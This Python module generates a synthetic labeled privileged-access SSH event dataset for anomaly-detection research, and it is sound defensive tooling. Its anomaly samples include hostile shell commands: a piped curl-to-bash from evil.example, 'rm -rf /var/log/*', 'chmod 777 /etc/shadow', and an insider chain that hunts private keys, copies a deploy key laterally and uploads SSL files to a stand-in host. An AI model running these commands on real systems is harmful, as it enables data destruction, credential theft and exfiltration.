"""Synthetic labeled privileged-access dataset for research benchmarks."""

import random
import uuid
from datetime import datetime, timezone
from typing import Dict, List, Tuple

NORMAL_COMMANDS = [
    'ls -la /var/log',
    'systemctl status nginx',
    'tail -n 50 /var/log/app.log',
    'df -h',
    'whoami',
    'cat /etc/hostname',
]

ANOMALY_COMMANDS = {
    'destructive': 'rm -rf /var/log/*',
    'exfil': 'curl http://evil.example/payload.sh | bash',
    'priv_esc': 'chmod 777 /etc/shadow',
}

NORMAL_ASSETS = ['prod-web-1', 'prod-web-2', 'staging-api']
ANOMALY_ASSETS = ['prod-db', 'vault-01', 'backup-srv']
NORMAL_IPS = ['203.0.113.10', '203.0.113.11']
ANOMALY_IPS = ['198.51.100.99', '203.0.113.200']


def _ts(hour: int, minute: int = 0) -> str:
    return datetime(2026, 7, 9, hour, minute, 0, tzinfo=timezone.utc).isoformat()


def _event(
    user: str,
    asset: str,
    ip: str,
    hour: int,
    command: str,
    label: int,
    anomaly_type: str = 'normal',
) -> dict:
    return {
        'event_id': str(uuid.uuid4()),
        'event_type': 'command.ingested',
        'timestamp': _ts(hour),
        'session_id': f'session-{user}-{asset}',
        'user_id': user,
        'asset_id': asset,
        'account': 'ubuntu',
        'protocol': 'ssh',
        'remote_addr': ip,
        'payload': {'input': command, 'timestamp': 1751796000.0},
        'metadata': {'source': 'pam_benchmark'},
        'label': label,
        'anomaly_type': anomaly_type,
    }


def generate_pam_dataset(
    n_normal: int = 800,
    n_anomaly: int = 200,
    seed: int = 42,
) -> Tuple[List[dict], Dict[str, int]]:
    """Return labeled events + counts by anomaly type."""
    random.seed(seed)
    events: List[dict] = []
    counts: Dict[str, int] = {'normal': 0}

    admins = [f'admin-{i}' for i in range(1, 11)]

    for _ in range(n_normal):
        user = random.choice(admins)
        asset = random.choice(NORMAL_ASSETS)
        ip = random.choice(NORMAL_IPS)
        hour = random.choice([9, 10, 11, 14, 15, 16])
        cmd = random.choice(NORMAL_COMMANDS)
        events.append(_event(user, asset, ip, hour, cmd, 0))
        counts['normal'] += 1

    anomaly_plan = [
        ('destructive', 40, lambda: (random.choice(admins), random.choice(NORMAL_ASSETS), random.choice(NORMAL_IPS), random.choice([9, 10, 14]), ANOMALY_COMMANDS['destructive'])),
        ('unusual_hour', 35, lambda: (random.choice(admins), random.choice(NORMAL_ASSETS), random.choice(NORMAL_IPS), random.choice([2, 3, 4]), random.choice(NORMAL_COMMANDS))),
        ('unusual_asset', 35, lambda: (random.choice(admins), random.choice(ANOMALY_ASSETS), random.choice(NORMAL_IPS), random.choice([9, 10, 14]), random.choice(NORMAL_COMMANDS))),
        ('unusual_ip', 35, lambda: (random.choice(admins), random.choice(NORMAL_ASSETS), random.choice(ANOMALY_IPS), random.choice([9, 10, 14]), random.choice(NORMAL_COMMANDS))),
        ('lateral_combo', 30, lambda: (random.choice(admins), random.choice(ANOMALY_ASSETS), random.choice(ANOMALY_IPS), random.choice([2, 3]), ANOMALY_COMMANDS['exfil'])),
        ('login_failed', 25, lambda: (random.choice(admins), random.choice(NORMAL_ASSETS), random.choice(ANOMALY_IPS), 3, '')),
    ]

    produced = 0
    for anomaly_type, quota, sampler in anomaly_plan:
        counts[anomaly_type] = 0
        while counts[anomaly_type] < quota and produced < n_anomaly:
            user, asset, ip, hour, cmd = sampler()
            if anomaly_type == 'login_failed':
                ev = _event(user, asset, ip, hour, cmd, 1, anomaly_type)
                ev['event_type'] = 'login.failed'
                ev['payload'] = {'reason': 'bad password'}
            else:
                ev = _event(user, asset, ip, hour, cmd, 1, anomaly_type)
            events.append(ev)
            counts[anomaly_type] += 1
            produced += 1

    # Progressive multi-command insider chains (for sequence DL / GNN training)
    progressive = [
        'find /home -name "*.pem" -o -name "id_rsa" 2>/dev/null',
        'cp /var/www/.ssh/deploy_key /tmp/.cache_update',
        'ssh -o BatchMode=yes -o ConnectTimeout=3 prod-db whoami',
        'scp -o StrictHostKeyChecking=no /tmp/.cache_update backup@prod-db:/tmp/',
        'tar czf /tmp/logs.tgz /etc/nginx/ssl && curl -s -F f=@/tmp/logs.tgz https://cdn-update.example/upload',
    ]
    normal_session_cmds = list(NORMAL_COMMANDS)
    n_prog = 40
    counts['progressive_sequence'] = 0
    for i in range(n_prog):
        user = f'admin-seq-{i % 5}'
        sid = f'session-prog-{i}'
        ip = random.choice(NORMAL_IPS)
        asset = random.choice(NORMAL_ASSETS)
        # warm normal commands in same session (label 0)
        for j, cmd in enumerate(random.sample(normal_session_cmds, k=min(3, len(normal_session_cmds)))):
            ev = _event(user, asset, ip, 10, cmd, 0)
            ev['session_id'] = sid
            ev['timestamp'] = _ts(10, j)
            events.append(ev)
        # attack chain (label 1 from first recon step)
        for j, cmd in enumerate(progressive):
            ev = _event(user, asset, ip, 10, cmd, 1, 'progressive_sequence')
            ev['session_id'] = sid
            ev['timestamp'] = _ts(10, 10 + j)
            events.append(ev)
            counts['progressive_sequence'] += 1

    # Benign multi-command sessions (negative sequences)
    for i in range(40):
        user = f'admin-benign-{i % 5}'
        sid = f'session-benign-{i}'
        ip = random.choice(NORMAL_IPS)
        asset = random.choice(NORMAL_ASSETS)
        for j, cmd in enumerate(random.sample(normal_session_cmds, k=min(5, len(normal_session_cmds)))):
            ev = _event(user, asset, ip, random.choice([9, 10, 14, 15]), cmd, 0)
            ev['session_id'] = sid
            ev['timestamp'] = _ts(10, j)
            events.append(ev)

    # Hard negatives: single "suspicious-looking" commands in otherwise normal sessions
    hard_negatives = [
        'find /var/www -name "*.conf"',
        'ssh staging-api uptime',
        'scp report.txt ubuntu@prod-web-2:/tmp/',
        'tar czf /tmp/app-logs.tgz /var/log/app',
        'curl -s https://status.internal/health',
    ]
    for i in range(30):
        user = f'admin-hardneg-{i % 5}'
        sid = f'session-hardneg-{i}'
        ip = random.choice(NORMAL_IPS)
        asset = random.choice(NORMAL_ASSETS)
        cmds = random.sample(normal_session_cmds, k=3) + [random.choice(hard_negatives)]
        random.shuffle(cmds)
        for j, cmd in enumerate(cmds):
            ev = _event(user, asset, ip, random.choice([9, 10, 14]), cmd, 0)
            ev['session_id'] = sid
            ev['timestamp'] = _ts(11, j)
            events.append(ev)

    random.shuffle(events)
    return events, counts
